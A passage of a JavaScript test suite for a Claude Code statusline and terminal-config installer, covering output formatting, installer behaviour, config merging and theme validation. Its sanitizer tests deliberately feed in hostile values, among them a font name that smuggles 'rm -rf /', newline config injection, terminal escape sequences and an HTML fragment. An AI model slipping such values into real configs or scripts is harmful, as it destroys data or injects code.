      sl: { on: true, seg, sep: ' | ', em: false, bar: 'blocks', ctxFmt: 'pct-of', ctxBasis: basis, text: '' },
    })));
    fs.writeFileSync(slFile2, res.body);
    return slFile2;
  };
  const runSl2 = (file, payload, env) => {
    const out = cp.spawnSync('node', [file], {
      input: JSON.stringify(payload), encoding: 'utf8', timeout: 5000,
      env: { ...process.env, ...(env || {}) },
    });
    return (out.stdout || '').replace(/\x1b\[[0-9;]*m/g, '');
  };
  const tr84 = path.join(TMP, 'tr84.jsonl');
  fs.writeFileSync(tr84, JSON.stringify({ message: { usage: { input_tokens: 84000, output_tokens: 0 } } }) + '\n');
  const base = { transcript_path: tr84, cwd: ROOT, model: { id: 'claude-fable-5', display_name: 'F' } };

  const withEffort = runSl2(await mkSl(['effort'], 'window'), { ...base, effort: { level: 'xhigh' } });
  ok(/xhigh/.test(withEffort), 'effort segment prints the live level', withEffort);
  // Absent on models with no effort parameter — it must vanish, not leave a stray gap.
  const noEffort = runSl2(await mkSl(['model', 'effort', 'ver'], 'window'), { ...base, version: '2.1.1' });
  ok(!/\|\s*\|/.test(noEffort) && /F \| v2\.1\.1/.test(noEffort),
    'effort segment disappears cleanly when the model has no effort', noEffort);

  // The auto-compact basis: the env override is what Claude Code itself honours first.
  const compactEnv = runSl2(await mkSl(['ctx'], 'autocompact'),
    { ...base, context_window: { context_window_size: 1000000 } },
    { CLAUDE_CODE_AUTO_COMPACT_WINDOW: '120000' });
  ok(/70% of 120k/.test(compactEnv), '84k against a 120k compact window reads 70%', compactEnv);
  const windowBasis = runSl2(await mkSl(['ctx'], 'window'),
    { ...base, context_window: { context_window_size: 1000000 } });
  ok(/8% of 1M/.test(windowBasis), 'the same usage against the 1M window reads 8%', windowBasis);
  // Nothing configured: fall back to the real window rather than inventing a threshold.
  const compactUnset = runSl2(await mkSl(['ctx'], 'autocompact'),
    { ...base, context_window: { context_window_size: 200000 } }, { CLAUDE_CODE_AUTO_COMPACT_WINDOW: '' });
  ok(/of 200k/.test(compactUnset),
    'with no autoCompactWindow set, the basis falls back to the real window', compactUnset);
  // The documented floor is 100k, and it can never exceed the real window.
  const compactSilly = runSl2(await mkSl(['ctx'], 'autocompact'),
    { ...base, context_window: { context_window_size: 200000 } },
    { CLAUDE_CODE_AUTO_COMPACT_WINDOW: '999999999' });
  ok(/of 200k/.test(compactSilly), 'a compact window larger than the real one is clamped', compactSilly);

  // non-numeric fields must degrade, never print NaN
  const badTok = mkTr({ message: { usage: { input_tokens: 'lots', output_tokens: 5 } } }, 'badtok.jsonl');
  const bad = runSl({ transcript_path: badTok, cwd: ROOT, model: { id: 'm', display_name: 'M' }, cost: { total_duration_ms: 'abc', total_lines_added: 'abc', total_lines_removed: {} }, output_style: { name: 'x' }, version: '1' });
  ok(bad.code === 0 && !/NaN/.test(bad.plain), 'non-numeric tokens/duration/lines never print NaN', bad.plain);

  // control characters in echoed strings must not add lines or retitle the terminal
  const ctrl = runSl({ cwd: ROOT, model: { display_name: 'M\nEVIL' }, output_style: { name: 'a]0;pwnedb' }, version: '1\n2' });
  ok(ctrl.code === 0 && !ctrl.plain.includes('\n') && !ctrl.plain.includes(']'),
    'echoed strings are stripped of control sequences', JSON.stringify(ctrl.plain));

  // degenerate stdin and paths
  for (const [label, stdin] of [['literal null', 'null'], ['array', '[1,2,3]'], ['number', '42'], ['garbage', 'nope'], ['empty', '']]) {
    const res2 = runSl(stdin);
    ok(res2.code === 0 && !/statusline error/.test(res2.plain), `stdin ${label} handled`, res2.plain.slice(0, 60));
  }
  const nonStr = runSl({ transcript_path: 12345, cwd: ROOT, model: { display_name: 'M' } });
  ok(nonStr.code === 0 && !/Deprecation|DEP0187/.test(nonStr.err), 'non-string transcript_path emits no deprecation warning', nonStr.err.slice(0, 80));
  const badWs = runSl({ workspace: { current_dir: 42 }, model: { display_name: 'M' } });
  ok(badWs.code === 0 && !/statusline error/.test(badWs.plain), 'non-string current_dir handled', badWs.plain.slice(0, 60));

  // a truncated install must still render rather than crash with a stack
  const truncated = path.join(TMP, 'sl-trunc.js');
  fs.writeFileSync(truncated, r.body.replace(/Buffer\.from\('[A-Za-z0-9+/=]+'/, "Buffer.from('bm90LWJhc2U2NC0='"));
  const tr2 = cp.spawnSync('node', [truncated], { input: JSON.stringify({ cwd: ROOT, model: { display_name: 'M' } }), encoding: 'utf8', timeout: 5000 });
  ok(tr2.status === 0 && !/at Object|Error:/.test(tr2.stderr), 'corrupted embedded config degrades instead of crashing', (tr2.stderr || '').slice(0, 80));

  console.log('— shayan installer —');
  // A real listening server in a SEPARATE process: the installed picker fetches
  // /list.txt with curl, and spawnSync below would block this process's event loop,
  // so an in-process server could never answer.
  const srvScript = path.join(TMP, 'srv.js');
  fs.writeFileSync(srvScript, [
    "const http=require('http');",
    `const h=require(${JSON.stringify(path.join(ROOT, 'api/index.js'))});`,
    'const s=http.createServer((rq,rs)=>{try{h(rq,rs);}catch(e){rs.statusCode=500;rs.end("err");}});',
    "s.listen(0,'127.0.0.1',()=>console.log(s.address().port));",
  ].join('\n'));
  const srvProc = cp.spawn('node', [srvScript], { stdio: ['ignore', 'pipe', 'pipe'] });
  const srvPort = await new Promise((resolve, reject) => {
    let buf = '';
    const t = setTimeout(() => reject(new Error('server did not start')), 10000);
    srvProc.stdout.on('data', d => { buf += d; const m = /(\d+)/.exec(buf); if (m) { clearTimeout(t); resolve(+m[1]); } });
    srvProc.on('error', reject);
  });
  const srvHost = '127.0.0.1:' + srvPort;
  // x-forwarded-proto is set explicitly because the handler defaults to https (right
  // for production behind Vercel, wrong for a plain-HTTP test server).
  const curl = p => cp.spawnSync('curl', ['-fsS', '-H', 'x-forwarded-proto: http', 'http://' + srvHost + p],
    { encoding: 'utf8', timeout: 10000 }).stdout || '';
  const shBody = curl('/shayan.sh');
  ok(shBody.includes(srvHost), 'installer targets the live test server', (shBody.match(/^ORIGIN=.*$/m) || [])[0]);
  r = { body: shBody };
  bashCheck(r.body, 'shayan_installer');
  // bash -n alone passed on the version that installed 0 bytes (it failed at RUNTIME
  // under set -u), so the installer has to actually run here.
  const instSh = path.join(TMP, 'inst.sh');
  fs.writeFileSync(instSh, r.body);
  const fakeHome = fs.mkdtempSync(path.join(TMP, 'home-'));
  // A PATH without node: the installer must not depend on it.
  const noNode = cp.spawnSync('bash', [instSh], { env: { HOME: fakeHome, PATH: '/usr/bin:/bin' }, encoding: 'utf8', timeout: 20000 });
  const cli = path.join(fakeHome, '.local/bin/shayan');
  ok(noNode.status === 0, 'installer succeeds without node on PATH', noNode.stderr);
  ok(fs.existsSync(cli) && fs.statSync(cli).size > 200, 'installed CLI is non-empty',
    fs.existsSync(cli) ? fs.statSync(cli).size + ' bytes' : 'missing');
  ok(fs.existsSync(cli) && (fs.statSync(cli).mode & 0o111) !== 0, 'installed CLI is executable');
  const cliBody = fs.existsSync(cli) ? fs.readFileSync(cli, 'utf8') : '';
  ok(!cliBody.includes('__SHAYAN_ORIGIN__'), 'no unsubstituted placeholder remains');
  ok(/^BASE="https?:\/\/[^"]+"$/m.test(cliBody), 'origin substituted into BASE', (cliBody.match(/^BASE=.*$/m) || [])[0]);
  bashCheck(cliBody, 'installed_cli');
  // The picker's arithmetic must not be frozen at install time, and 010 must not be octal.
  ok(cliBody.includes('i=$((i+1))'), 'loop counter is evaluated at run time, not baked in');
  ok(cliBody.includes("sed 's/^0*//'"), 'leading zeros stripped so 010 is not octal 8');
  ok(/\$\{#IDS\[@\]\}/.test(cliBody), 'empty-array guard present for bash 3.2');
  // The picker must list all 11 presets, correctly numbered.
  const listRun = cp.spawnSync('bash', [cli], { input: 'q\n', env: { HOME: fakeHome, PATH: '/usr/bin:/bin' }, encoding: 'utf8', timeout: 20000 });
  ok(listRun.status === 0, 'q quits cleanly', (listRun.stdout + listRun.stderr).trim().split('\n').pop());
  ok(/ 1\) Tokyo Night/.test(listRun.stdout) && / 11\) Anthropic Stock/.test(listRun.stdout),
    'picker numbers all 11 entries', JSON.stringify(listRun.stdout.slice(0, 120)));
  // Valid choices must resolve to the entry the user actually saw. 010/08 are the
  // interesting ones: bash arithmetic would read them as octal without the strip.
  const stubBin = fs.mkdtempSync(path.join(TMP, 'bin-'));
  fs.writeFileSync(path.join(stubBin, 'npx'), '#!/bin/sh\necho "stub npx $*"\n', { mode: 0o755 });
  const nodeDir = path.dirname(cp.spawnSync('bash', ['-lc', 'command -v node'], { encoding: 'utf8' }).stdout.trim() || '/usr/bin/node');
  const applyPath = `${stubBin}:${nodeDir}:/usr/bin:/bin`;
  for (const [choice, want] of [['8', 'winter'], ['08', 'winter'], ['10', 'monochrome'], ['010', 'monochrome']]) {
    const run = cp.spawnSync('bash', [cli], { input: choice + '\n', env: { HOME: fakeHome, PATH: applyPath }, encoding: 'utf8', timeout: 30000 });
    const both = run.stdout + run.stderr;
    ok(both.includes('/config/' + want + '.json'), `choice ${JSON.stringify(choice)} applies ${want}`,
      (both.match(/\/config\/[a-z-]+\.json/) || ['no config fetch'])[0]);
  }
  // Invalid choices must exit non-zero with a clean message and no raw bash errors.
  for (const choice of ['0', 'abc', '', '99']) {
    const run = cp.spawnSync('bash', [cli], { input: choice + '\n', env: { HOME: fakeHome, PATH: '/usr/bin:/bin' }, encoding: 'utf8', timeout: 20000 });
    const both = run.stdout + run.stderr;
    const noisy = /unbound variable|bad array subscript|value too great|syntax error/.test(both);
    ok(run.status === 1 && !noisy && /Invalid choice/.test(both), `choice ${JSON.stringify(choice)} rejected cleanly`,
      'status ' + run.status + ' :: ' + both.trim().split('\n').pop());
  }
  // An unreachable server must say so rather than emit a bash internal error.
  const downCli = path.join(TMP, 'shayan-down');
  fs.writeFileSync(downCli, cliBody.replace(srvHost, '127.0.0.1:1'), { mode: 0o755 });
  const downRun = cp.spawnSync('bash', [downCli], { input: '1\n', env: { HOME: fakeHome, PATH: '/usr/bin:/bin' }, encoding: 'utf8', timeout: 20000 });
  const downBoth = downRun.stdout + downRun.stderr;
  ok(downRun.status === 1 && /Could not reach/.test(downBoth) && !/unbound variable/.test(downBoth),
    'unreachable server reports a friendly error', downBoth.trim().split('\n').pop());
  srvProc.kill();

  // ── the cmux layer ────────────────────────────────────────
  // /cmux writes two files that are not ours: a Ghostty config that may already hold
  // hand-written settings, and a JSONC cmux.json that may hold keys we know nothing
  // about. Clobbering either is the failure mode that matters, so the merge, the
  // backup, the idempotency and the refuse-to-guess path all get asserted here.
  console.log('— cmux —');
  const CM = require('./api/_cmux.js');
  const bash = (file, home) => cp.spawnSync('bash', [file],
    { encoding: 'utf8', env: Object.assign({}, process.env, { HOME: home }) });

  const cmDef = CM.sanitizeCmux({ on: true });
  ok(cmDef && Object.keys(cmDef).length > 30,
    'sanitizeCmux returns the full settings object', cmDef ? Object.keys(cmDef).length + ' keys' : 'null');
  ok(CM.sanitizeCmux({ on: false }) === null, 'cmux off yields no layer');
  ok(CM.sanitizeCmux(null) === null && CM.sanitizeCmux([]) === null && CM.sanitizeCmux('x') === null,
    'garbage payloads yield no layer');

  // Share links are strangers' input and every value below lands in a config file or
  // a shell script, so each one has to come back neutered.
  const hostile = CM.sanitizeCmux({
    on: true,
    fontFamily: 'x"; rm -rf /',
    theme: 'One Dark\nfont-size = 99',
    titleTemplate: 'a\nbc]0;pwned',
    paneBorder: 'red;"><img src=y>',
    indicatorStyle: 'constructor', appearance: '__proto__', branchLayout: 'toString',
    fontSize: 1e9, bgOpacity: -5, tintOpacity: 'abc', scrollSpeed: 99, scrollback: -1,
  });
  ok(!/["';]/.test(hostile.fontFamily), 'hostile font-family sanitized', JSON.stringify(hostile.fontFamily));
  ok(!/[\n]/.test(hostile.theme + hostile.titleTemplate),
    'newline injection into the config files is blocked',
    JSON.stringify([hostile.theme, hostile.titleTemplate]));
  ok(/^#[0-9a-f]{6}$/i.test(hostile.paneBorder), 'a non-colour is rejected', hostile.paneBorder);
  ok(CM.INDICATOR_STYLES.indexOf(hostile.indicatorStyle) >= 0
    && CM.APPEARANCES.indexOf(hostile.appearance) >= 0
    && CM.BRANCH_LAYOUTS.indexOf(hostile.branchLayout) >= 0,
    'prototype-chain names do not pass the enum check',
    [hostile.indicatorStyle, hostile.appearance, hostile.branchLayout].join(','));
  ok(hostile.fontSize <= 32 && hostile.bgOpacity >= 0 && hostile.bgOpacity <= 1
    && hostile.tintOpacity >= 0 && hostile.scrollSpeed <= 3 && hostile.scrollback > 0,
    'out-of-range numbers are clamped',
    JSON.stringify([hostile.fontSize, hostile.bgOpacity, hostile.tintOpacity, hostile.scrollSpeed]));

  // The colours the user did not pin come from the Claude Code palette. That layering
  // is the whole reason this page exists, so it is asserted rather than eyeballed.
  const nord = { subtle: [67, 76, 94], accent: [136, 192, 208], bg: [46, 52, 64] };
  const layered = CM.resolveCmuxColors(cmDef, nord);
  ok(layered.paneBorder === '#434c5e' && layered.activePaneBorder === '#88c0d0'
    && layered.tint === '#2e3440' && layered.selection === '#88c0d0',
    'unpinned cmux colours derive from the Claude Code palette', JSON.stringify(layered));

  const cmFile = path.join(TMP, 'cmux.sh');
  const cmBlock = CM.cmuxApplyBlock(hostile, nord);
  fs.writeFileSync(cmFile, '#!/bin/bash\nset -euo pipefail\n' + cmBlock);
  ok(cp.spawnSync('bash', ['-n', cmFile], { encoding: 'utf8' }).status === 0, 'bash -n: cmux layer');
  ok(!/[\x00-\x08\x0b\x0c\x0e-\x1f]/.test(cmBlock), 'no control characters reach the generated script');

  // A real user's HOME: hand-written Ghostty settings, and a cmux.json carrying
  // comments, a trailing comma and keys we must not touch.
  const cmHome = path.join(TMP, 'cmuxhome');
  fs.mkdirSync(path.join(cmHome, '.config', 'ghostty'), { recursive: true });
  fs.mkdirSync(path.join(cmHome, '.config', 'cmux'), { recursive: true });
  const gPath = path.join(cmHome, '.config', 'ghostty', 'config');
  const jPath = path.join(cmHome, '.config', 'cmux', 'cmux.json');
  fs.writeFileSync(gPath, 'font-thicken = true\nkeybind = cmd+k=clear_screen\n');
  fs.writeFileSync(jPath, '{\n  // a comment, which cmux.json allows\n  "schemaVersion": 1,\n'
    + '  "myUnmanagedKey": "keep me",\n  "sidebar": { "somethingElseOfMine": 42 },\n}\n');

  const cmRun = bash(cmFile, cmHome);
  ok(cmRun.status === 0, 'cmux layer applies cleanly', (cmRun.stderr || '').trim().slice(0, 120));
  const gAfter = fs.readFileSync(gPath, 'utf8');
  ok(/font-thicken = true/.test(gAfter) && /keybind = cmd[+]k/.test(gAfter),
    'hand-written ghostty settings survive');
  ok(/>>> shayan-cc-config [(]cmux[)] >>>/.test(gAfter), 'the ghostty block is marked for later replacement');
  let jAfter = JSON.parse(fs.readFileSync(jPath, 'utf8'));
  ok(jAfter.myUnmanagedKey === 'keep me' && jAfter.sidebar.somethingElseOfMine === 42,
    'unmanaged cmux.json keys survive the merge', JSON.stringify(Object.keys(jAfter)));
  ok(jAfter.schemaVersion === 1, 'schemaVersion is left at 1', String(jAfter.schemaVersion));
  ok(fs.readdirSync(path.dirname(jPath)).some(f => /cmux[.]json[.]backup-/.test(f))
    && fs.readdirSync(path.dirname(gPath)).some(f => /config[.]backup-/.test(f)),
    'both files were backed up before being touched');

  bash(cmFile, cmHome);
  ok((fs.readFileSync(gPath, 'utf8').match(/>>> shayan-cc-config [(]cmux[)] >>>/g) || []).length === 1,
    're-running does not stack a second ghostty block');
  ok(JSON.parse(fs.readFileSync(jPath, 'utf8')).myUnmanagedKey === 'keep me',
    'unmanaged keys survive a second run too');

  // Ghostty reads two config files on macOS and the Application Support one wins,
  // because a later directive overrides an earlier one. Writing only to ~/.config left
  // every colour we set losing to whatever the user had set through Ghostty's own UI —
  // which is where most macOS configs actually live. Verified with a real installed
  // Ghostty: a background in ~/.config lost to a different background in Application
  // Support. So the block goes into both, and the Application Support one is never
  // created from nothing.
  const macRel = 'Library/Application Support/com.mitchellh.ghostty/config';

  // Only the XDG config present: the macOS file must NOT be conjured up.
  const xdgOnly = path.join(TMP, 'gh-xdg');
  fs.mkdirSync(path.join(xdgOnly, '.config', 'ghostty'), { recursive: true });
  fs.writeFileSync(path.join(xdgOnly, '.config/ghostty/config'), 'font-thicken = true\n');
  bash(cmFile, xdgOnly);
  ok(fs.readFileSync(path.join(xdgOnly, '.config/ghostty/config'), 'utf8').includes('shayan-cc-config (cmux)'),
    'the XDG ghostty config is always written');
  ok(!fs.existsSync(path.join(xdgOnly, macRel)),
    'the macOS ghostty config is not created when it does not exist');

  // Both present: both get the block, and ours must land AFTER theirs in the file
  // Ghostty reads last, or it does not win.
  const bothHome = path.join(TMP, 'gh-both');
  fs.mkdirSync(path.join(bothHome, '.config', 'ghostty'), { recursive: true });
  fs.mkdirSync(path.dirname(path.join(bothHome, macRel)), { recursive: true });
  fs.writeFileSync(path.join(bothHome, '.config/ghostty/config'), 'font-thicken = true\n');
  fs.writeFileSync(path.join(bothHome, macRel), '# set through the ghostty UI\nfont-size = 9\n');
  bash(cmFile, bothHome);
  const macText = fs.readFileSync(path.join(bothHome, macRel), 'utf8');
  ok(macText.includes('shayan-cc-config (cmux)'), 'the macOS ghostty config is written when it exists');
  ok(/# set through the ghostty UI/.test(macText), 'their own macOS config keys survive');
  ok(macText.indexOf('# >>> shayan-cc-config') > macText.indexOf('font-size = 9'),
    'our block sits after their directives, so ours is the one that wins');
  ok(fs.readdirSync(path.dirname(path.join(bothHome, macRel))).some(f => /config[.]backup-/.test(f)),
    'the macOS ghostty config is backed up before being touched');
  bash(cmFile, bothHome);
  ok((fs.readFileSync(path.join(bothHome, macRel), 'utf8').match(/>>> shayan-cc-config/g) || []).length === 1,
    're-running does not stack a second block in the macOS config');

  // XDG_CONFIG_HOME must be honoured rather than assuming ~/.config.
  const xdgHome = path.join(TMP, 'gh-xdgenv');
  fs.mkdirSync(path.join(xdgHome, 'custom'), { recursive: true });
  cp.spawnSync('bash', [cmFile], {
    encoding: 'utf8',
    env: Object.assign({}, process.env, { HOME: xdgHome, XDG_CONFIG_HOME: path.join(xdgHome, 'custom') }),
  });
  ok(fs.existsSync(path.join(xdgHome, 'custom/ghostty/config')),
    'XDG_CONFIG_HOME is honoured instead of assuming ~/.config');

  // An unparseable cmux.json is a file we do not understand. Guessing would destroy
  // someone's config, so the installer stops and says so.
  const badHome = path.join(TMP, 'cmuxbad');
  fs.mkdirSync(path.join(badHome, '.config', 'cmux'), { recursive: true });
  const badPath = path.join(badHome, '.config', 'cmux', 'cmux.json');
  fs.writeFileSync(badPath, 'not json at all {{{\n');
  const badRun = bash(cmFile, badHome);
  ok(badRun.status === 1, 'an unparseable cmux.json aborts rather than guessing', 'exit ' + badRun.status);
  ok(fs.readFileSync(badPath, 'utf8') === 'not json at all {{{\n',
    'the file it could not parse is left untouched');

  const newHome = path.join(TMP, 'cmuxnew');
  fs.mkdirSync(newHome, { recursive: true });
  ok(bash(cmFile, newHome).status === 0, 'cmux layer works on a machine with no config yet');
  ok(JSON.parse(fs.readFileSync(path.join(newHome, '.config/cmux/cmux.json'), 'utf8')).schemaVersion === 1,
    'a freshly created cmux.json is valid JSON');

  // Every key and every value we can write, checked against cmux's own schema.
  // This exists because the indicatorStyle enum shipped wrong once — 'typographic'
  // for 'typography', plus a 'none' that is not a cmux value — and nothing caught
  // it: `cmux config validate` checks JSONC syntax only and exits 0 on out-of-enum
  // values. The schema is the only thing that discriminates.
  const cmSchema = require('./test/fixtures/cmux.schema.json');
  function schemaProblems(node, sch, at) {
    const bad = [];
    if (!sch) return [at + ' is not in the schema'];
    if (node && typeof node === 'object' && !Array.isArray(node)) {
      for (const k of Object.keys(node)) {
        const child = (sch.properties || {})[k];
        const where = at ? at + '.' + k : k;
        if (!child) {
          if (sch.additionalProperties === false) bad.push(where + ' is rejected (additionalProperties:false)');
          continue;
        }
        bad.push(...schemaProblems(node[k], child, where));
      }
      return bad;
    }
    if (sch.enum && sch.enum.indexOf(node) < 0) {
      bad.push(at + ' = ' + JSON.stringify(node) + ' is not in [' + sch.enum.join(', ') + ']');
    }
    if (sch.type === 'number' || sch.type === 'integer') {
      if (typeof sch.minimum === 'number' && node < sch.minimum) bad.push(at + ' = ' + node + ' below minimum ' + sch.minimum);
      if (typeof sch.maximum === 'number' && node > sch.maximum) bad.push(at + ' = ' + node + ' above maximum ' + sch.maximum);
    } else if (sch.type) {
      const t = Array.isArray(node) ? 'array' : typeof node;
      if (t !== sch.type) bad.push(at + ' is ' + t + ', schema wants ' + sch.type);
    }
    return bad;
  }
  const stripOurs = o => { const c = JSON.parse(JSON.stringify(o)); delete c['$schema']; return c; };

  const defProblems = schemaProblems(stripOurs(CM.buildCmuxJson(cmDef, nord)), cmSchema, '');
  ok(defProblems.length === 0, 'the default cmux.json validates against the schema', defProblems.slice(0, 3).join('; '));

  // Every value the page can offer, not just the defaults: an enum this UI lists but
  // cmux does not accept is a config the app silently ignores.
  const enumSets = [
    ['indicatorStyle', CM.INDICATOR_STYLES],
    ['appearance', CM.APPEARANCES],
    ['placement', CM.PLACEMENTS],
    ['contentAlignment', CM.ALIGNMENTS],
    ['branchLayout', CM.BRANCH_LAYOUTS],
  ];
  const enumProblems = [];
  for (const [key, values] of enumSets) {
    for (const v of values) {
      const patch = { on: true }; patch[key] = v;
      const written = CM.buildCmuxJson(CM.sanitizeCmux(patch), nord);
      const p2 = schemaProblems(stripOurs(written), cmSchema, '');
      if (p2.length) enumProblems.push(key + '=' + v + ': ' + p2[0]);
    }
  }
  ok(enumProblems.length === 0,
    'every enum value the page offers is one cmux accepts', enumProblems.slice(0, 3).join('; '));

  // And the reverse: a value cmux supports but the page hides is a missing feature,
  // which is how 'washRail' and 'blueWashColorRail' went absent for a while.
  const schemaInd = cmSchema.properties.workspaceColors.properties.indicatorStyle.enum;
  ok(schemaInd.every(v => CM.INDICATOR_STYLES.indexOf(v) >= 0),
    'the page offers every indicator style cmux supports',
    schemaInd.filter(v => CM.INDICATOR_STYLES.indexOf(v) < 0).join(', '));

  // Stale share links carrying a retired value must fall back, never pass through.
  ok(CM.sanitizeCmux({ on: true, indicatorStyle: 'typographic' }).indicatorStyle === 'leftRail'
    && CM.sanitizeCmux({ on: true, indicatorStyle: 'none' }).indicatorStyle === 'leftRail',
    'a share link with a retired indicator style falls back to the default');

  // ── the theme presets ─────────────────────────────────────────────────────
  // A preset makes two claims that can rot silently: that a named Ghostty theme
  // exists on the machine, and that its palette matches what that theme actually
  // renders. Both are checked against the installed bundle when it is present.
  const PRE = require('./api/_cmux_presets.js');
  const clientPresets = PRE.presetsForClient();
  ok(clientPresets.length >= 12, 'presets are defined', clientPresets.length + ' presets');

  const PAL_KEYS = ['bg', 'raised', 'text', 'comment', 'subtle', 'accent', 'accent2',
    'cyan', 'green', 'red', 'orange', 'yellow', 'pink', 'blue'];
  const presetProblems = [];
  const seenIds = new Set();
  for (const pr of clientPresets) {
    if (seenIds.has(pr.id)) presetProblems.push(pr.id + ': duplicate id');
    seenIds.add(pr.id);
    if (!/^[a-z0-9-]+$/.test(pr.id)) presetProblems.push(pr.id + ': id is not kebab-case');
    if (pr.kind !== 'community' && pr.kind !== 'example') presetProblems.push(pr.id + ': unknown kind ' + pr.kind);
    // The whole point of the labelling is that one claim is checkable and the other
    // is authored here, so a community preset without evidence is not shippable.
    if (pr.kind === 'community' && !pr.evidence) presetProblems.push(pr.id + ': community preset with no evidence');
    if (pr.kind === 'community' && !pr.credit) presetProblems.push(pr.id + ': community preset with no credit');
    if (pr.kind === 'community' && !pr.theme) presetProblems.push(pr.id + ': community preset names no Ghostty theme');
    if (!pr.blurb) presetProblems.push(pr.id + ': no blurb');
    if (!pr.pal) { presetProblems.push(pr.id + ': no palette'); continue; }
    for (const k of PAL_KEYS) {
      const v = pr.pal[k];
      if (!Array.isArray(v) || v.length !== 3
        || v.some(n => !Number.isInteger(n) || n < 0 || n > 255)) {
        presetProblems.push(pr.id + ': palette key ' + k + ' is not an rgb triple');
      }
    }
  }
  ok(presetProblems.length === 0, 'every preset is well-formed and labelled',
    presetProblems.slice(0, 4).join('; '));

  // A preset's cm overrides must be real settings at legal values, or picking one
  // would silently write a setting cmux ignores.
  const overProblems = [];
  for (const pr of clientPresets) {
    for (const k of Object.keys(pr.cm || {})) {
      if (!Object.prototype.hasOwnProperty.call(CM.CMUX_DEFAULTS, k)) {
        overProblems.push(pr.id + ': overrides unknown setting ' + k);
        continue;
      }
      const applied = CM.sanitizeCmux(Object.assign({ on: true }, pr.cm));
      if (JSON.stringify(applied[k]) !== JSON.stringify(pr.cm[k])) {
        overProblems.push(pr.id + ': ' + k + '=' + JSON.stringify(pr.cm[k])
          + ' does not survive the sanitizer (got ' + JSON.stringify(applied[k]) + ')');
      }
    }
  }
  ok(overProblems.length === 0, 'preset setting overrides are all real and legal',
    overProblems.slice(0, 4).join('; '));

  // Selecting a preset must change the two files, and the chrome must follow the
  // preset's palette rather than the Claude Code one.
  const ccPal = { bg: [26, 27, 38], subtle: [48, 52, 70], accent: [122, 162, 247] };
  const layerProblems = [];
  for (const pr of clientPresets) {
    const san = CM.sanitizeCmux({ on: true, preset: pr.id });
    if (san.preset !== pr.id) { layerProblems.push(pr.id + ': id did not survive the sanitizer'); continue; }
    const lines = CM.buildGhosttyLines(san, ccPal);
    const kv = Object.fromEntries(lines);
    if (pr.theme && kv.theme !== pr.theme) layerProblems.push(pr.id + ': theme line is ' + kv.theme);
    if (!pr.theme && !kv.background) layerProblems.push(pr.id + ': example preset wrote no background');
    const json = CM.buildCmuxJson(san, ccPal);
    const expect = '#' + pr.pal.subtle.map(n => n.toString(16).padStart(2, '0')).join('');
    if (json.paneBorderColor !== expect) {
      layerProblems.push(pr.id + ': pane border ' + json.paneBorderColor + ' should be ' + expect);
    }
  }
  ok(layerProblems.length === 0,
    'each preset drives the ghostty colour lines and the cmux chrome from its own palette',
    layerProblems.slice(0, 4).join('; '));

  // Example themes are ours, so unlike the community ones their readability is our
  // responsibility rather than their author's. Every number below is computed from the
  // hex, not asserted in a comment — an earlier draft of these themes claimed a
  // comment contrast of 5.3:1 while shipping 2.27:1 in the slot that actually renders
  // dimmed text, which is exactly the mistake this catches.
  const tools = require('./tools/extract-ghostty-themes.js');
  const hx2rgb = h => [1, 3, 5].map(i => parseInt(h.slice(i, i + 2), 16));
  const ratio = (a, b) => tools.contrast(
    typeof a === 'string' ? hx2rgb(a) : a, typeof b === 'string' ? hx2rgb(b) : b);

  const examples = clientPresets.filter(pr => pr.kind === 'example');
  ok(examples.length >= 5, 'example themes are defined', examples.length + ' examples');

  const exProblems = [];
  for (const pr of examples) {
    const full = PRE.presetById(pr.id);
    const sc = full && full.scheme;
    if (!sc) { exProblems.push(pr.id + ': no scheme, so nothing would be written'); continue; }
    if (!/^#[0-9a-f]{6}$/.test(sc.bg) || !/^#[0-9a-f]{6}$/.test(sc.fg)) exProblems.push(pr.id + ': bad bg/fg');
    if (!Array.isArray(sc.ansi) || sc.ansi.length !== 16) {
      exProblems.push(pr.id + ': ansi has ' + (sc.ansi || []).length + ' entries, needs 16');
      continue;
    }
    sc.ansi.forEach((h, i) => { if (!/^#[0-9a-f]{6}$/.test(h)) exProblems.push(pr.id + ': ansi' + i + ' = ' + h); });

    const textCR = ratio(sc.fg, sc.bg);
    if (textCR < 4.5) exProblems.push(pr.id + ': body text ' + textCR.toFixed(2) + ':1 below 4.5');
    const cmtCR = ratio(pr.pal.comment, pr.pal.bg);
    if (cmtCR < 3) exProblems.push(pr.id + ': dimmed text ' + cmtCR.toFixed(2) + ':1 below 3');
    const bordCR = ratio(pr.pal.subtle, pr.pal.bg);
    if (bordCR < 1.25) exProblems.push(pr.id + ': border ' + bordCR.toFixed(2) + ':1 — invisible');

    for (const k of ['accent', 'accent2', 'cyan', 'green', 'red', 'orange', 'yellow', 'pink', 'blue']) {
      const r = ratio(pr.pal[k], pr.pal.bg);
      if (r < 3) exProblems.push(pr.id + ': ' + k + ' ' + r.toFixed(2) + ':1 on its background');
    }

    // A bright slot that matches its normal counterpart makes bold text invisible.
    for (let i = 0; i < 8; i++) {
      const a = hx2rgb(sc.ansi[i]), b = hx2rgb(sc.ansi[i + 8]);
      const d = Math.abs(a[0] - b[0]) + Math.abs(a[1] - b[1]) + Math.abs(a[2] - b[2]);
      if (d < 30) exProblems.push(pr.id + ': ansi' + (i + 8) + ' is indistinguishable from ansi' + i);
    }

    // The palette must be derived from the scheme, or preview and install disagree.
    if (pr.pal.bg.join(',') !== hx2rgb(sc.bg).join(',')) exProblems.push(pr.id + ': pal.bg does not match scheme.bg');
    if (pr.pal.text.join(',') !== hx2rgb(sc.fg).join(',')) exProblems.push(pr.id + ': pal.text does not match scheme.fg');
  }
  ok(exProblems.length === 0, 'every example theme is readable and internally consistent',
    exProblems.slice(0, 5).join('; '));

  // Calling something "made for this site" while shipping a near-copy of a community
  // theme would be the one dishonest thing this table could do.
  const dupes = [];
  for (const ex of examples) {
    for (const cp of clientPresets.filter(x => x.kind === 'community')) {
      if (ratio(ex.pal.bg, cp.pal.bg) < 1.06 && ratio(ex.pal.accent, cp.pal.accent) < 1.06) {
        dupes.push(ex.name + ' is a near-duplicate of ' + cp.name);
      }
    }
  }
  ok(dupes.length === 0, 'no example theme is a near-copy of a community theme', dupes.join('; '));

  // Range and setting variety are the reason to ship five rather than one.
  const lights = examples.filter(pr => tools.lum(pr.pal.bg) > 0.5).length;
  ok(lights >= 1 && lights < examples.length,
    'the examples cover both light and dark', lights + ' light of ' + examples.length);
  const indStyles = new Set(examples.map(pr => (PRE.presetById(pr.id).cm || {}).indicatorStyle || 'leftRail'));
  ok(indStyles.size === examples.length,
    'no two example themes share an indicator style', [...indStyles].join(', '));

  // An example preset must write its colours out; there is no theme file to name.
  const notWritten = examples.filter(pr => {
